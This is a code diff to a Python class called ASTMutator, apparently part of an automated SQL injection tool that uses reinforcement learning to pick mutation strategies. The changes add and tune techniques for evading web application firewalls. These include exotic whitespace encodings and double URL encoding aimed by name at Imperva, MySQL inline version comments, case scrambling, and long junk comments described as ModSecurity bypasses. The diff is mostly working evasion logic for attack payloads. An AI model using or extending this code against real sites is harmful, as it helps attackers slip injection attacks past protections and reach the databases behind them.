@@ -50,6 +50,11 @@ class ASTMutator:
         self.strategy_weights["scientific_notation"] = 3.0
         self.strategy_weights["wide_byte"] = 2.0
         
+        # Auxiliary WAF mutation properties
+        self.strategy_weights["exotic_whitespace"] = 1.0
+        self.strategy_weights["whitespace_variations"] = 1.0
+        self.strategy_weights["url_encoding"] = 1.0
+        self.strategy_weights["case_swap"] = 1.0
         # Gene Credit Assignment: Track reputation of each keyword
         self.keyword_reputation = {kw: 1.0 for kw in self.sql_keywords}
         # Point 3: Contextual Credit Assignment (Sequences)
@@ -57,7 +62,7 @@ class ASTMutator:
         
         # Point 7: Deep Actor-Critic Integration
         from core.agent_rl import RLAgent
-        self.rl_agent = RLAgent(state_dim=11, action_names=list(self.strategy_weights.keys()), learning_rate=learning_rate, exploration_rate=exploration_rate)
+        self.rl_agent = RLAgent(state_dim=11, action_names=list(self.strategies.keys()), learning_rate=learning_rate, exploration_rate=exploration_rate)
         
         self.last_strategy_used = None
         self.last_payload_used = None
@@ -93,8 +98,8 @@ class ASTMutator:
         if waf_weights:
             for w_name, val in waf_weights.items():
                 if w_name in self.strategy_weights:
-                    self.strategy_weights[w_name] = max(self.strategy_weights[w_name], val)
-                    print(f"[*] Mutator: WAF Strategy Applied - Boosting {w_name} to {self.strategy_weights[w_name]}", flush=True)
+                    self.strategy_weights[w_name] = val
+                    print(f"[*] Mutator: WAF Strategy Applied - Setting {w_name} to {val}", flush=True)
 
     def _strip_wrappers(self, payload):
         """Isolate core gene: Strip known outer wrappers and terminators before mutation."""
@@ -608,12 +613,18 @@ class ASTMutator:
         techniques = []
         # Technique 1: Inline comments
         mid = len(token) // 2
-        if getattr(self, 'strategy_weights', {}).get("inline_comments", 1.0) > 1.5:
+        inline_weight = getattr(self, 'strategy_weights', {}).get("inline_comments", 1.0)
+        exotic_weight = getattr(self, 'strategy_weights', {}).get("exotic_whitespace", 1.0)
+
+        if inline_weight > 1.5:
             techniques.append(f"{token[:mid]}/*1337*/{token[mid:]}")
             techniques.append(f"/*!1337{token}*/")
-        else:
+        elif inline_weight > 0.5:
             techniques.append(f"{token[:mid]}/**/{token[mid:]}")
-        
+        else:
+            # Inline comments strongly disabled, use URL encoding or exotic formats
+            techniques.append(token)
+            
         # Technique 2: Case scrambling
         techniques.append("".join([c.upper() if random.random() > 0.5 else c.lower() for c in token]))
         
@@ -629,11 +640,16 @@ class ASTMutator:
         if " " in token and getattr(self, 'strategy_weights', {}).get("whitespace_variations", 1.0) > 1.5:
             techniques.append(token.replace(" ", "/*%00*/"))
             techniques.append(token.replace(" ", "%09")) # Tab
+        elif " " in token and getattr(self, 'strategy_weights', {}).get("exotic_whitespace", 1.0) > 1.5:
+            # specifically for rigorous WAFs like Imperva that block /**/, /*!1337*/ and percent encoding 00
+            techniques.append(token.replace(" ", "%0b"))
+            techniques.append(token.replace(" ", "%0c"))
+            techniques.append(token.replace(" ", "%0a%0d"))
         elif " " in token:
             techniques.append(token.replace(" ", "/**/"))
 
         # Technique 5: Standard wrappers
-        if not re.match(r"^[a-zA-Z\s]+$", token) and len(token) > 2: 
+        if not re.match(r"^[a-zA-Z\s]+$", token) and len(token) > 2 and inline_weight > 0.5: 
              techniques.append(f"/*!{token}*/")
 
         # Technique 6: MySQL Scientific notation for numbers
@@ -908,6 +924,9 @@ class ASTMutator:
         return self._traverse_and_mutate_ast(ast)
 
     def _inline_version_comments(self, payload):
+        if getattr(self, 'strategy_weights', {}).get("inline_comments", 1.0) < 0.5:
+            return payload
+            
         mutated = payload
         for kw in self.sql_keywords:
             if kw in mutated.upper():
@@ -1001,12 +1020,19 @@ class ASTMutator:
         chunk_size = max(1, len(payload) // num_chunks)
         chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
         
-        junk_patterns = [
-            "/**/", "/*" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4)) + "*/",
-            "/*!*/", " "
-        ]
+        junk_patterns = [" "]
         
-        if getattr(self, 'strategy_weights', {}).get("junk_fill", 1.0) > 1.5:
+        inline_weight = getattr(self, 'strategy_weights', {}).get("inline_comments", 1.0)
+        if inline_weight > 0.5:
+            junk_patterns.extend([
+                "/**/", "/*" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=4)) + "*/",
+                "/*!*/"
+            ])
+            
+        if getattr(self, 'strategy_weights', {}).get("exotic_whitespace", 1.0) > 1.5:
+            junk_patterns.extend(["%0b", "%0c", "%09", "%0a%0d"])
+            
+        if getattr(self, 'strategy_weights', {}).get("junk_fill", 1.0) > 1.5 and inline_weight > 0.5:
             # Heavy junk fill for ModSecurity bypasses
             junk_patterns.append("/*" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=random.randint(50, 200))) + "*/")
             junk_patterns.append("/*!" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(10, 30))) + "*/")
@@ -1020,8 +1046,15 @@ class ASTMutator:
         return fragmented
 
     def _single_layer_encoding(self, payload):
-        """Single Layer Encoding: Skipped because requests module encodes by default."""
-        return payload
+        """Single Layer / URL Encoding."""
+        import urllib.parse
+        mutated = urllib.parse.quote(payload)
+        
+        # specifically for rigorous WAFs like Imperva handling double encode
+        if getattr(self, 'strategy_weights', {}).get("url_encoding", 1.0) > 1.5:
+            mutated = urllib.parse.quote(mutated)
+            
+        return mutated
 
     def _dynamic_structural_mutation(self, payload):
         """Dynamic Structural Mutation: Avoids mechanical substitution by generating unique bypass patterns."""
